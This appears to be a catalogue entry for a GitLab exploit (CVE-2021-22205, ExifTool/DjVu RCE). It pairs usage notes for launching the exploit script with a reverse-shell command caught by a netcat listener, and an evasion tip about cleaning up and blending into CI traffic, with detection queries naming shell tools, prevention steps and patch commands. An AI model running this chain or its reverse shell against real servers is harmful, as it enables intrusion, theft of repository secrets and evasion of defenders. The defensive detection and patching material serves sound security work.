examples.label: Authenticated RCE (CVE-2021-22205 chain) firing a reverse shell
Catch the shell on a listener

notes: CVE-2021-22205 (ExifTool/DjVu) hits older GitLab; some versions need a low-priv authenticated user, hence the userenum step. Fires a reverse shell directly - have a listener ready.

recommended.note: Supplies the valid account this exploit authenticates with.
Turn the authenticated RCE into a reverse shell

name: GitLab - Authenticated RCE (CVE-2021-22205)
description: Exploits the ExifTool/DjVu flaw (CVE-2021-22205) in GitLab to run commands. Provide a reverse-shell command and catch it with netcat. Some versions are unauthenticated.

defense.why_it_works: CVE-2021-22205 exploits an ExifTool RCE vulnerability in GitLab's file upload processing. GitLab passes uploaded images to ExifTool for metadata processing; a crafted DjVu file with malicious metadata triggers arbitrary command execution on the GitLab server.
defense.prerequisites: GitLab CE/EE 11.9-13.10.2. Ability to upload files. ExifTool version < 12.24.
defense.impact: RCE as the git user on the GitLab server. Access to all repositories, CI/CD credentials, and the GitLab database containing secrets and tokens.
defense.detection: Upload of a DjVu file to GitLab. ExifTool process spawning child commands. Outbound network from git user. SIEM alert for CVE-2021-22205 payload signature.
defense.artifacts: GitLab application log (file upload triggering ExifTool) | Network flow: git user -> attacker reverse shell | EDR: unexpected child process from exiftool
defense.splunk_spl:
index=sysmon EventCode=1 (ParentImage="*w3wp.exe" OR ParentImage="*httpd*" OR ParentImage="*apache*" OR ParentImage="*php-cgi*" OR ParentImage="*php-fpm*" OR ParentImage="*java.exe" OR ParentImage="*tomcat*")
| where match(Image, "(?i)(cmd|powershell|bash|sh|nc|python)")
| table _time, Computer, ParentImage, Image, CommandLine

index=web sourcetype=access_combined (method=POST OR status=500)
| stats count by clientip, uri_path | where count>3
defense.elastic_kql: event.code:"1" AND process.parent.name:(w3wp.exe OR httpd OR apache2 OR php-fpm OR java.exe) AND process.name:(cmd.exe OR powershell.exe OR bash OR sh OR nc OR python*)
defense.sentinel_kql:
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("w3wp.exe","httpd","apache2","php-fpm","php-cgi","java.exe","nginx")
| where FileName in~ ("cmd.exe","powershell.exe","bash","sh","nc","python")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
| sort by Timestamp desc
// GitLab ExifTool RCE (CVE-2021-22205) - gitlab/ruby spawning a shell
defense.prevention: Update GitLab to 13.10.3+ and ExifTool to 12.24+. Restrict outbound network from GitLab server. Monitor ExifTool for unexpected child process creation.
defense.misconfiguration: GitLab running unpatched ExifTool (< 12.24) with no network egress controls on the server.
defense.vulnerable_config:
# GitLab < 13.10.3 + ExifTool < 12.24
# ExifTool processes DjVu metadata including shell metacharacters
# No egress filtering on GitLab server
defense.secure_config:
# Update GitLab
gitlab-ctl upgrade
# Update ExifTool
apt-get install --only-upgrade libimage-exiftool-perl
# Restrict git user outbound
iptables -A OUTPUT -u git -j DROP
defense.evasion: Use valid session/token auth; clean up any runner/CI job or dropped file used for execution; blend into normal CI traffic.

explain:
Exploits the GitLab ExifTool/DjVu flaw for RCE (CVE-2021-22205):
  python3 gitlab_13_10_2_rce.py   the exploit
  -t http://<url>:8081            target
  -u/-p                           GitLab credentials (some versions are unauthenticated)
  -c '<reverse_shell>'            the command to run
Malicious image metadata is passed to a vulnerable ExifTool, executing your command; give it a reverse-shell one-liner and catch it with 'nc -lnvp'.
